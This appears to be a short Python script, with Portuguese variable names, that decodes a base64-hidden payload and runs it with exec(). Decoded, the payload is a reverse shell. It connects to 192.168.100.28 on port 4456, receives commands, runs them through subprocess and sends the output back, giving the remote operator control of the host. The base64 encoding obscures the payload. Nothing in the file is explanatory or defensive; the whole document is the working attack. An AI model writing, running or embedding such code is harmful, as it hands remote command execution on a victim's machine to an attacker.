import base64

codigo = 'aW1wb3J0IHNvY2tldAppbXBvcnQgc3lzCmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwoKaXBfc2Vydmlkb3IgPSAnMTkyLjE2OC4xMDAuMjgnCnBvcnRhX3NlcnZpZG9yID0gNDQ1Ngp0YW1hbmhvX2J1ZmZlciA9IDEwMjQgKiAxMjgKc2VwYXJhZG9yID0gJzwtPicKCnMgPSBzb2NrZXQuc29ja2V0KCkKCnMuY29ubmVjdCgoaXBfc2Vydmlkb3IsIHBvcnRhX3NlcnZpZG9yKSkKCmN3ZCA9IG9zLmdldGN3ZCgpCnByaW50KGN3ZCkKcy5zZW5kKGN3ZC5lbmNvZGUoKSkKCndoaWxlIFRydWU6CiAgICBjb21hbmRvX3NoZWxsID0gcy5yZWN2KHRhbWFuaG9fYnVmZmVyKS5kZWNvZGUoKQogICAgaWYgY29tYW5kb19zaGVsbC5sb3dlcigpID09ICdzYWlyJzoKICAgICAgICBzLmNsb3NlKCkKICAgIGlmIGNvbWFuZG9fc2hlbGwuc3BsaXQoKVswXSA9PSAnY2QnOgogICAgICAgIHRyeToKICAgICAgICAgICAgb3MuY2hkaXIoJycuam9pbihjb21hbmRvX3NoZWxsLnNwbGl0KClbMV0pKQogICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvciBhcyBlOgogICAgICAgICAgICByZXN1bHQgPSBlCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmVzdWx0ID0gJycKICAgIGVsc2U6CiAgICAgICAgcmVzdWx0ID0gc3VicHJvY2Vzcy5nZXRvdXRwdXQoY29tYW5kb19zaGVsbCkKICAgIGN3ZCA9IG9zLmdldGN3ZCgpCiAgICBtZW5zYWdlbSA9IGYne3Jlc3VsdH17c2VwYXJhZG9yfXtjd2R9JwogICAgcy5zZW5kKG1lbnNhZ2VtLmVuY29kZSgpKQo='

mensagem_base64 = codigo
base64_bytes = mensagem_base64.encode('ascii')
mensagem_bytes = base64.b64decode(base64_bytes)
mensagem = mensagem_bytes.decode('ascii')
print(mensagem)
exec(mensagem)